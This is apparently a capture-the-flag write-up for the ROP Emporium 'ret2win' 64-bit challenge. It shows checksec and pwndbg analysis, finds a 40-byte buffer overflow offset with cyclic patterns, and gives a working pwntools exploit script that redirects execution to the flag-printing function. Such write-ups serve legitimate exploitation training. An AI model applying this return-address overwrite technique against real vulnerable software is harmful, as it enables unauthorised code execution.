## 64 bits

```
$ checksec ret2win
[*] '/home/localuser/ropemporium/ret2win/64bits/ret2win'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Let's open the binary on GDB and start analyzing it:

```bash
pwndbg> info func
All defined functions:

Non-debugging symbols:
0x0000000000400528  _init
0x0000000000400550  puts@plt
0x0000000000400560  system@plt
0x0000000000400570  printf@plt
0x0000000000400580  memset@plt
0x0000000000400590  read@plt
0x00000000004005a0  setvbuf@plt
0x00000000004005b0  _start
0x00000000004005e0  _dl_relocate_static_pie
0x00000000004005f0  deregister_tm_clones
0x0000000000400620  register_tm_clones
0x0000000000400660  __do_global_dtors_aux
0x0000000000400690  frame_dummy
0x0000000000400697  main
0x00000000004006e8  pwnme
0x0000000000400756  ret2win
0x0000000000400780  __libc_csu_init
0x00000000004007f0  __libc_csu_fini
0x00000000004007f4  _fini
```

```
pwndbg> disassemble ret2win 
Dump of assembler code for function ret2win:
   0x0000000000400756 <+0>:     push   rbp
   0x0000000000400757 <+1>:     mov    rbp,rsp
   0x000000000040075a <+4>:     mov    edi,0x400926
   0x000000000040075f <+9>:     call   0x400550 <puts@plt>
   0x0000000000400764 <+14>:    mov    edi,0x400943
   0x0000000000400769 <+19>:    call   0x400560 <system@plt>
   0x000000000040076e <+24>:    nop
   0x000000000040076f <+25>:    pop    rbp
   0x0000000000400770 <+26>:    ret    
End of assembler dump.
pwndbg> x/s 0x400943
0x400943:       "/bin/cat flag.txt"
```

So there's `pwnme`, `ret2win`, `main` calls `pwnme`and pwnme it's using `read` that is vulnerable to a buffer overflow, `ret2win` is calling `system`, with the argument `/bin/cat flag.txt`

First let's find the offset by generating a cyclic pattern:

```python
>>> cyclic(100)                                                                                                                                                                        
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
```

Now send it to the binary and with pwndbg see the value of `RSP`:
```bash
RSP  0x7fffffffdec8 ◂— 0x6161616c6161616b ('kaaalaaa')
```

And use the `cyclic_find()` function:

```python
>>> cyclic_find(0x6161616b)
40
```

So the offset it's at 40 bytes, now take the address of the `ret2win` function, and the final exploit would be like this:

```python
from pwn import *

p = process("./ret2win")
elf = ELF("./ret2win")


ret2win_addr = p64(0x400764)

payload = b"a"*40
payload += ret2win_addr

p.recvuntil(">")
p.sendline(payload)
p.recvline()
p.interactive()
```





